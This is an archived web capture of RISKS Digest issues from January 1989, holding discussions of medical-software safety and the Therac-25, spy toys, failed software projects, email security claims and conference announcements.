     To many manufacturers and users of medical products, the FDA's idea of
flexibility leaves too much uncertainty and opens up the possibility of
increased regulation in the future.  "The FDA casts too wide a net," says
Edward M. Basile of King &amp; Spalding, a law firm in Washington, D.C.  "Their
basic assumption is that everything should be regulated."
     "There's no disagreement about the extremes," says Harold M. Schoolman of
the National Library of Medicine in Bethesda, Md.  "The question is how and
where to draw the line between the extremes."  The important issue, he says, is
maintaining a balance between appropriate safeguards and incentives for
innovation.
     Even in situations where it's clear that certain software ought to be
reviewed, the FDA faces the additional difficulty of how to go about verifying
that a particular computer program does what it's supposed to do -- nothing
more, nothing less.  As experience with software for other applications has
shown, the task of checking software quality can be overwhelming (SN: 9/13/86,
p. 171).
     A few years ago, when most medical devices did not contain computers, it
was relatively easy to foresee all possible inputs and to check the
consequences of each one, says James Howard of General Electric's Medical
Systems Group in Milwaukee, Wis.  With computers, the number of possible paths
is greatly increased.  "It's more important than ever to build safe products
that perform as required," he says.  But because a detailed analysis takes so
long, it often can't be done.  "This is a major concern to both manufacturers
and the FDA," says Howard.
     The FDA defines software as a "set of instructions that enables a
computing machine to control, monitor or otherwise interact with a medical
device." The proposed regulations require a software developer to show that the
algorithm, or mathematical recipe, used in the computer program is appropriate
and has been implemented correctly in the software.  The FDA also requires
assurance that any software failure would not injure the patient.
     How that assurance can be provided is still unclear.  Techniques for
evaluating software safety are relatively new.  Who does the checking, how much
evidence is enough and whether the FDA can perform an independent check are
also unresolved issues.  Furthermore, software developers are wary of
submitting complete listings of the instructions in their computer programs
because competitors may get a look at this "source code" by making a request to
the FDA under the Freedom of Information Act.
     The trouble with the FDA approach, says Howard, is that it doesn't
consider under what conditions software is used.  Instead, the FDA ought to
focus on the idea that not all computer errors are equally serious.  Using a
kind of hazard analysis to focus on situations that could lead to
life-threating computer failures would be one way to eliminate the most serious
potential faults and to shorten testing times.
     Software developers also need to improve the methods they use for
constructing computer programs.  We need to "industrialize" software
development so that programs are written in a consistent way, says James
Dobbins of Verilog USA, Inc., in Alexandria, Va.  Too often, programmers
include a description of what each part of a program does only as an
afterthought.  They rarely go back to clean up or polish a program to make it
more understandable.
     Software development can be standardized and automated, says Dobbins.
"The tools are there to industrialize the whole process.  You just have to go
find them."
     Programmers, on the other hand, complain that they're in a no-win
situation.  Software is continually modified as it evolves, often to meet
demands for new features to make the product more competitive.  In the rush to
market, when delays can put a company at a competitive disadvantage, software
testing often loses out.  Delays in completing a software package are balanced
against the possibility of failing to root out potentially embarrassing errors.
     This is the kind of situation that can lead to lawsuits, says Vincent
Brannigan, an attorney in Adelphi, Md.  Software is clearly a product, he says.
If it's defective and injures a consumer, then the manufacturer is liable.
     Among the faults Brannigan lists is the tendency of software and computer
companies to promise more than they can fulfill and to cut costs by doing less
testing.  This is the only field, he says, where the customer is expected to
pay for finishing a product through the purchase of periodic updates and
corrections to the software.
     "Disclaimers don't mean anything," Brannigan says.  "The product should
have been right in the first place." That means paying much more attention to
how software is written and tested.  "The software must look as shiny and clean
as the rest of the machine," he says.
     So far, software developers have generally escaped damaging lawsuits and
settlements, but that may change.  To many medical-device producers, the threat
of litigation may be even more effective than proposed FDA regulations for
assuring the quality of products.
     Even finding out what went wrong is a time-consuming process.  The FDA and
other groups are still investigating aspects of why the Therac 25, manufactured
by Atomic Energy of Canada Ltd. in Kanata, Ontario, failed.  What's evident is
that the problem could probably have been avoided if an appropriate safety
analysis had been done.
     The Therac 25 delivers two forms of radiation:  either a high-energy
electron beam or, when a metal target intercepts the electron beam, a
lower-energy X-ray beam.  It turns out that when a nimble, experienced
technician punches in a particular sequence of commands faster than the
programmers had anticipated, the metal target fails to swing into place.
     A safety analysis would have identified the missing target as a
potentially dangerous situation.  The machine could have been programmed so
that it couldn't operate if the target, as confirmed by a sensor, were not in
place.
     Perhaps such a complex, computer-driven machine wasn't even necessary.  By
sacrificing a little convenience and flexibility, a machine with a simple
on-off switch and a timer could probably have done the same job - with a much
smaller chance of failure.

    [This is a familiar topic to RISKS readers, but this particular article
    is extremely well written and seems worth including, even if old.  
    (RISKS has reported one additional death involving the Therac.)  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.04.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.06.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-56</DOCNO>
<DOCOLDNO>IA012-000131-B036-415</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.6.html 128.240.150.127 19970217024858 text/html 26021
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:47:24 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 6</TITLE>
<LINK REL="Prev" HREF="/Risks/8.05.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.07.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.05.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.07.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 6</H1>
<H2> Thursday 12 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Computers and Civil Liberties, article by Gary Marx 
</A>
<DD>
<A HREF="#subj1.1">
Ronni Rosenberg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Losing systems 
</A>
<DD>
<A HREF="#subj2.1">
Vince Manis
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Our blinders [with respect to RISKS] 
</A>
<DD>
<A HREF="#subj3.1">
Don Alvarez
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Totally secure MAIL &amp; infallible aeroplane warning systems 
</A>
<DD>
<A HREF="#subj4.1">
Nigel Roberts
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  "Disaster Becomes a Matter of Routine" 
</A>
<DD>
<A HREF="#subj5.1">
Steve Philipson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Biased coverage of hacker's convention by CBS 
</A>
<DD>
<A HREF="#subj6.1">
Richard Thomsen
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  SAFECOMP89 
</A>
<DD>
<A HREF="#subj7.1">
Udo Voges
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Name this book -- for a box of cookies! 
</A>
<DD>
<A HREF="#subj8.1">
Cliff Stoll
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Computers and Civil Liberties, article by Gary Marx
</A>
</H3>
<address>
Ronni Rosenberg
&lt;<A HREF="mailto:ronni@juicy-juice.lcs.mit.edu ">
ronni@juicy-juice.lcs.mit.edu 
</A>&gt;
</address>
<i>
Thu, 12 Jan 89 13:07:11 EST
</i><PRE>

	"This is the year of spying kits for kids," by Gary Marx

In a popular song Paul Simon tells us that `these are the days of miracle and
wonder.'  Surely this is so for the lucky child faced with a cornucopia of
computer and other electronic toys this holiday season.  But among the games
and educational tools is one category that should give us pause: spy toys.

In one catalogue, under the heading `Toys to Grow On,' for $19.95 you can
have Super Ears, which `help you detect even the slightest sounds!  Slip on
the headset and aim the disk; even if your target is far away, you'll hear
every rustle, every footstep, every breath, and every word!'  Another
stethoscope-like device permits you to hear `quiet breathing, through a
concrete wall a foot thick' and with `fidelity good enough to record.'  And
for only a few dollars, stockings can be stuffed with a Dyna-Mike Transmitter;
smaller than a quarter, it `will transmit every sound in a room to an FM radio
tuned to the proper frequency' up to two miles away.  Consider, too, the
possibilities of voice-activated miniature tape recorders that can be slipped
into a pocket, a drawer or under the bed.

In the wonderful world of advertising, eavesdropping is defined as a game and
spying on others is portrayed as fun and exciting.  Sellers argue that such
toys are also educational in introducing children to the mysteries of sound,
hearing and electricity, not to mention toe practical skills being developed.

In addition to listening to sounds in the woods and to playmates, older
brothers and sisters and even mommy and daddy can be secretly spied on.
Imagine the fun!  Think of the implications for the family power structure.
Children are now offered technical means of watching their parents, as well
as the reverse.  Children's rights take on new meaning.  As an added benefit,
adults may behave better at home, both because they want to set a good example
for curious children and because they fear being turned in by them.

And it is fun to spy on people.  Such `toys' directly feed childhood fantasies
of omnipotence.,  While not the same as being Superman and able to fly, it is
magical to be able to overhear conversations through a wall or from several
hundred yards away, or to secretly capture sound and play it back.

But it can also be wrong.  To encourage children to play at such activities
without at the same time instructing them in the immorality of invasive
information technology is irresponsible.

Defenders of toy guns argue that their products are just make-believe and are
harmless because they don't really work.  Children can indulge their violent
or protective fantasies without doing any immediate harm or confusing their
game with reality.  But this is not the case with many of the surveillance
devices.  They are attractive because they really do work.  Children are no
longer required even to pretend or to fantasize.

In becoming accustomed to such toys and the pleasures they bring, the seeds of
an amoral and suspicious adulthood are unwittingly being cultivated.

There are parallels to computer hackers.  How many of the growing number of
young computer criminals have simply carried over into their adult life a
juvenile game view of computer hacking, in which morality is irrelevant and
all that matters is the technical challenge?  Will private bugging,
wiretapping and video surveillance expand as a generation matures having had
these devices as childhood toys?

Children are also learning about the world of surveillance from the many
child-monitoring devices marketed for parents: transmitters clipped to a
child's clothing or put into a shoe that trigger an alarm on a parental
monitor if the child strays out of the signal-range area; wide-area
room-scanning by remote video; audio devices in children's bedrooms; at-home
urine tests for drugs.  What must the world look like to the child subjected
to these devices and simultaneously also given spy toys to play with.

At holiday time in a free-market economy, it is probably subversive or worse
to suggest that toys be banned on the basis of the bad moral message that they
send, rather than on the basis of the physical damage that they can do.  Yet
in the long run the latter may even be more costly because it is insidious and
its effects subtle and long-lasting.

One would hope that parents would favor toys that build trust and cooperation,
or that are at least neutral in the moral lessons that they bring, rather than
those that encourage spying and deception.  Children's and consumer advocacy
groups might add surveillance toys to their opposition to toys of violence.
At minimum there should be warning labels on such listening devices indicating
that their use in certain ways is illegal.  The toys should also come with
guidelines for appropriate use and instructional materials to help parents
discuss with children the moral issues around surreptitious listening and
recording.

In his novel `It Can't Happen Here,' Sinclair Lewis warned that if liberty
ever were undermined in the United States, it would be from within and would
occur gradually, even benignly.  He didn't have such toys in mind, but they
nicely illustrate his point."

[Dr. Marx is on the faculty of MIT's Dept. of Urban Studies and Planning and
author of *Undercover: Police Surveillance in America* (University of CA Press,
1988).  This op-ed article appeared on Christmas Day in The Los Angeles Times
and was reprinted with the author's permission in MIT's Tech Talk on 1/11/89.]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Losing systems
</A>
</H3>
<address>
Vince Manis
&lt;<A HREF="mailto:manis@grads.cs.ubc.ca ">
manis@grads.cs.ubc.ca 
</A>&gt;
</address>
<i>
Thu, 12 Jan 89 04:43:19 PST
</i><PRE>
Organization: UBC Department of Computer Science, Vancouver, B.C., Canada

I don't get it. An issue of Risks arrives with not one but two accounts of
megabuck systems which essentially go into the trashcan.  Yet there are all
sorts of things, ranging from better procurement practices through structured
systems analysis which are supposed to have made these white elephants a thing
of the past.

I can think, offhand, of a number of hypotheses to explain the
continuing inability to deliver reliable, useful, on-budget software:

1) the technical people are all incompetent (I'm in the process of marking data
structures exams at the moment, so maybe I'm giving this one more credence than
I should!)

2) management people are all incompetent (perhaps in hiring incompetent
technical people, perhaps in interfering with technical aspects of the
procurement process)

3) large bureaucratic structures of the sort found in government and industry
inherently interfere with the development of usable systems

4) the `structured programming revolution', and structured systems analysis,
really don't count for much

5) structured systems analysis is a good idea, but practitioners don't know how
to apply it effectively

Undoubtedly, the true answer is a mixture of these, along with others that I
just can't think of at 4:45 am. The issue is not finding a specific cause (if
#3 is to blame, there's not too much we can do about that!); rather, we as
professionals should try to identify the factors which bring about system
demise, and loudly describe them to all and sundry.

It seems clear that all the methodologies in the world won't rescue a system
which is designed by an administrator in conjunction with a marketing person
from a vendor; nor would one expect anything worthwhile from a system effort in
which no user/management input was ever solicited. We have to do more of a job
of explaining the limits and the imperatives of the technology to non-technical
people than we've been doing so far.

   [By the way, today's San Francisco Chronicle has an article on the new
   computer system for the Bay Area Rapid Transit (BART) that is finally being
   readied for operation, many years late and many millions of dollars over
   budget.  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Our blinders [with respect to RISKS]
</A>
</H3>
<address>
Don Alvarez 
&lt;<A HREF="mailto:boomer@space.mit.edu">
boomer@space.mit.edu
</A>&gt;
</address>
<i>
Thu, 12 Jan 89 11:59:11 EST
</i><PRE>

     RISKS is a forum dedicated to computer related risks, so it is natural
that the articles presented should focus primarily on risks and computers.
This reader, however, often feels that the conclusions reached here miss
important points because the authors have consciously or unconsciously wrapped
themselves in RISKS blinders.
     Since they arrived this morning, I will use the two articles in RISKS 8.5
as examples: "Digital Photos and the Authenticity of Information" (Dave
Robbins) and "Medical software" (Ivars Peterson via Robert Morris).
     The first article begins with a discussion of computer editing of
photographs, and the ease with which such previously incontrovertible evidence
can now be forged.  The author then goes on to make three main points, which I
will restate briefly:
     1)  Electronically stored records can be altered or forged without
         leaving any visible traces.
     2)  Computer technology makes it easier to forge or alter records
         because more people posses the neccesary skills.
     3)  Computer technology makes it possible to store such large amounts
         of data that we are unable to check the validity of any
         single record.
     I certainly agree with Mr. Robbins that there are important issues raised
by computer based record keeping, but I don't believe these three are among
them.  The first and third points are related, so I will discuss them together.
While the sheer mass of information makes it more difficult to authenticate
records by "conventional" means, these records are not unauditable.  This same
mass of records enables far more sophisticated consistancy checking than was
ever before possible.  Welfare fraud is possible in a non-computer based
environment, but sorting the ranks of welfare recipients against the owners of
40 foot yachts and mercedes-benz automobiles is not.  With regards to the ease
of forging provided by computers, I do not agree with mr. Robbins in any way.
Yes, there are some individuals who are now able to forge records far more
effectively than they ever could in the past, but this is ignoring the tens or
even hundreds of thousands of people who could forge records in the past but
are unable to now.  In high school, I could forge the birthdate on my drivers
license with a pencil and a piece of chalk.  I'd like to see the typical high
school kid do the same level of forgery to a microprocessor controlled smart
card.  It is true that forgery of photographs is coming into the hands of the
common "criminal," but the very ease of forgery will be what is responsible for
removing such records from the ranks of acceptible evidence.  Video tapes will
probably continue to be acceptible until such time as they can be economically
altered.
     In RISKS, we tend to have our blinders on to the dangers alone.  There are
unquestionably very real risks in our information based society, but if you
look at the risks in a vacuum devoid of gains and benefits, you will deprive
yourself of enourmous advantages.  I may have arguements with the enormous
corporations which maintain my credit records, but at the same time I am very
thankful to them for providing the service which enables me to walk into any
store anywhere in the world and pay for goods in any currency with a small
piece of plastic which is linked to my bank account.
     The second article, on "Medical Software" is an example of a different
kind of blinder which we wear.  The problem of testing and validating advanced
hardware is not in any way unique to computers.  Within my lifetime we have had
advances across the board which raise these questions.  Electric motors have
become so powerful, lightweight, and common place that manufacturers of lawn
tools have to explicitly state that the lawn mower should not be carried at
waist height to trim shrubs.  Hair driers and portable radios have become so
ubiquitous that manufacturers have to worry about consumers placing them in or
near the sink or shower.  The only thing which makes the computer industry
unique is that it is young enough to have been granted special priviledges to
sell incomplete or unfinished products.  General Motors issues a recall.
Microsoft SELLS you version 4.0.
     Product liability is extremely important in the computer field, as it is
in any other field, but we should not place our selves on so high a pedastle
that we can not see the connections between what we are doing and what other
fields are doing, because that is precisely what got us into this problem in
the first place.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Totally secure MAIL &amp; infallible aeroplane warning systems
</A>
</H3>
<address>
Nigel Roberts
&lt;<A HREF="mailto:roberts%untadh.DEC@decwrl.dec.com ">
roberts%untadh.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
Thu, 12 Jan 89 06:20:36 PST
</i><PRE>

Following as it did the intelligent &amp; informed _Guardian_ leader article 
on the risks on technology (RISKS 8-4), there was an item today's paper, 
in the COMPUTER GUARDIAN section which makes me really shudder. 

In an article comparing the changing roles of FAX, telex and electronic 
mail, Warren Newman writes:

   "There are disadvantages to FAX and telex. The main one being lack 
   of confidentiality. An electronic mailbox is secure. You have the 
   key in the form of a password and only you can look at the contents.

   Most fax machines and telex machines are kept in common service areas
   where a secretary or clerk will collect the message and deliver it"

			-- from "Fax becomes a favourite",
			   Computer Guardian, Thursday January 12 1989

What nonsense! This sort of thing perpetuates the conspiracy of silence 
concerning risks of electronic mail systems.

Going back to the subject of the 737 crash at East Midlands Airport,
I noticed another item of possible interest to RISKS readers in today's
paper.

	"Mr Freddie Yetman, technical secretary of the British Airline
	Pilots' Association [the pilots's union --NR] said that the 
	investigators 'must have some suspicion of these circuits'.

	'It points to a possible spurious warning being given to the
	flight deck. But how the devil do you get a spurious warning
	from an infallible system?' "

			-- from "Suspect jets are grounded",
			   The Guardian, Thursday January 12 1989

Nigel Roberts, Munich, W. Germany

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
"Disaster Becomes a Matter of Routine" (M1 Plane Crash, RISKS-8.4)
</A>
</H3>
<address>
Steve Philipson 
&lt;<A HREF="mailto:steve@aurora.arc.nasa.gov">
steve@aurora.arc.nasa.gov
</A>&gt;
</address>
<i>
Thu, 12 Jan 89 12:19:17 PST
</i><PRE>

   The underlying implication of the excerpted article is that high technology
should bring perfect safety.  This is not a premise that most of us would
consider valid.  It is also not necessarily the goal of all high-tech systems.

   Improved technology is supposed to bring some kind of improvement.  It might
be improved safety, performace, economy or something else.  Our modern
airliners have clearly shown themselves to be superior in many ways to our old
models.  The latest airline technology has not yet had a chance to prove itself
in service, but the new features are intended to yield all-around "better"
aircraft.

   Fighter aircraft on the other hand, are not designed to be the safest
vehicles we can make, but rather are intended to be able to survive hostile
threats while successfully attacking a target.  Their hi-tech is primarily
directed at military goals.  Indeed they do crash, and they are dangerous.  It
is not higher technology that is the problem though, but rather the nature of
fighter aircraft tactics and training.  Training in populated areas will
involve costs in lives on the ground.  That is not an issue of technology but
rather one of policy.

   High technology, including computer technology, is not going to solve
all of our problems at once.  The author of the article observes this in 
the last line of the quoted paragraph.  On the other hand, high-technology
is not necessarily creating worse problems.  In this case, new airliners 
are not necessarily less safe.  What we as technologists must do is make 
the public aware of the limitations of our work, so that backlash against 
the failures that will occur will not prevent us as a society from making 
progress, improvements, and bettering the lot of mankind.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Biased coverage of hacker's convention by CBS
</A>
</H3>
<address>
Richard Thomsen
&lt;<A HREF="mailto:rgt%beta@LANL.GOV ">
rgt%beta@LANL.GOV 
</A>&gt;
</address>
<i>
Thu, 12 Jan 89 08:38:31 MST
</i><PRE>

In the March 1989 issue of ANALOG Science Fiction/Science Fact, there is a
quote from George Gerbner as follows:

	If you can write a nation's stories, you needn't worry
	about who makes its laws.  Today, television tells most
	of the stories to most of the people most of the time.

Welcome to the ranks of those who get bad and biased press [...].
                            				        Richard Thomsen

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
SAFECOMP89
</A>
</H3>
<address>
 KFK/KARLSRUHE - VOGES 
&lt;<A HREF="mailto:<IDT766@DKAKFK3.BITNET>  ">
&lt;IDT766@DKAKFK3.BITNET&gt;  
</A>&gt;
</address>
<i>
01/12/89 12:45:13 CET
</i><PRE>

Call for Papers and First Announcement
IFAC/IFIP-Workshop "Safety of Control Computer Systems"
SAFECOMP'89
December 5-7, 1989, Vienna, Austria

SCOPE
SAFECOMP'89 will deal with safety related applications of industrial
computer systems. Such systems are used in transportation, production
industry, power plants, medical and emergency systems. New aspects have
to be considered by the extension of electronic data interchange for
trade (EDI) and computer integrated manufacturing. The objective is to
reduce the potential to injure, kill, lose property or cause hazard
to environment. It should be noted that for systems with safety and
environmental protection the problems of guarantee and product
liability are closely related.

TOPICS
+ Planning, Specification, Design and Architecture of safe computer systems
+ Verification and Licensing of safety related computer systems
+ Operation and Maintenance of safety related computer systems
+ Safety related Documentation and Project Management Techniques
+ Identification, metrics and recognizing weak signals for improving safety
+ Applications, case studies and experiences
+ Data on safety related systems and data collection
+ Measurement of Quality for safety
+ Standardisation questions
+ Aspects concerning human and living environment
+ Artificial Intelligence for safety related applications
+ Tools and systems approach for achieving safe computer systems

DEADLINES
+ Four copies of the abstract (in English) should be received not
  later than 15 january 1989.
+ Notification of preliminary acceptance: 28 Febr. 1989
+ Submission of full paper: 30 June 1989

MAILING ADDRESS
Austrian Center for Productivity and Efficiency, OEPWZ, 
Dkfm. Mag. W. Steiskal, Rockhgasse 6, A-1014 Vienna  AUSTRIA
Tel.: +43 222 638636  Telex: 115718 oepwz  Telefax: +43 222 63863636

This Workshop is the next in series to Safecomp'88 (see RISKS 7.78)

Udo Voges, KFK Karlsruhe, IDT766@DKAKFK3.EARN

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 Name this book  -- for a box of cookies!
</A>
</H3>
<address>
Cliff Stoll
&lt;<A HREF="mailto:cliff@LBL.Gov ">
cliff@LBL.Gov 
</A>&gt;
</address>
<i>
Tue, 10 Jan 89 02:10:18 PST
</i><PRE>

Fellow Riskees:

I'm writing a book, and I need a title.
  
It's about computer risks:  counter-espionage, networks, computer security, 
and a hacker/cracker that broke into military computers.  It's a true 
story about how we caught a spy secretly prowling through the Milnet.
  
Although it explains technical stuff, the book is aimed at the lay reader.
In addition to describing how this person stole military information,
it tells of the challenges of nailing this guy, and gives a slice of 
life from Berkeley, California.
  
You can read a technical description of this incident in the 
Communications of the ACM, May, 1988;  or Risks Vol 6, Num 68.

Better yet, read what my editor calls "A riveting, true-life adventure of
electronic espionage" ... available in September from Doubleday, publishers of
the finest in computer counter-espionage nonfiction books.
  
  
So what?
  
Well, I'm stuck on a title.  Here's your chance to name a book.  
  
Suggest a title (or sub-title).  If my editor chooses your title, 
I'll give you a free copy of the book, credit you in the acknowledgements, 
and send you a box of homemade chocolate chip cookies.
  
Send your suggestions to    CPStoll@lbl.gov   or   CPStoll@lbl (bitnet) 
             Many thanx!    Cliff Stoll

  [Weihnachts STOLLen (German Christmas cookies) might be appropriate for
  the cookies.  With a different publisher, Cliff could have called the book
  "Stalking the Wiley Hacker".  But since Abner Doubleday is widely credited
  with having invented baseball, you could call it "Who's on Wurst?".  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.05.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.07.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-57</DOCNO>
<DOCOLDNO>IA012-000131-B037-9</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.7.html 128.240.150.127 19970217024912 text/html 24092
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:47:40 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 7</TITLE>
<LINK REL="Prev" HREF="/Risks/8.06.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.08.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.06.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.08.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 7</H1>
<H2> Sunday 15 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Re: Medical Software (Are computer risks different?) 
</A>
<DD>
<A HREF="#subj1.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Ground proximity warning 
</A>
<DD>
<A HREF="#subj2.1">
Bill Standerfer via Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Aircraft 
</A>
<DD>
<A HREF="#subj3.1">
Dale Worley
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  You don't know what you've got till it's gone.  
</A>
<DD>
<A HREF="#subj4.1">
Phil Agre
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Data integrity 
</A>
<DD>
<A HREF="#subj5.1">
Brent Laminack
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Quality of Evidence 
</A>
<DD>
<A HREF="#subj6.1">
Bill Murray
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  D.Robbins' conclusions (Authenticity of Information) 
</A>
<DD>
<A HREF="#subj7.1">
Allan Pratt
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Risks of trusting the press 
</A>
<DD>
<A HREF="#subj8.1">
Brad Templeton
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Risks of Remote Student Registration: Another Interaction Story     
</A>
<DD>
<A HREF="#subj9.1">
Gary McClelland
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Medical information systems 
</A>
<DD>
<A HREF="#subj10.1">
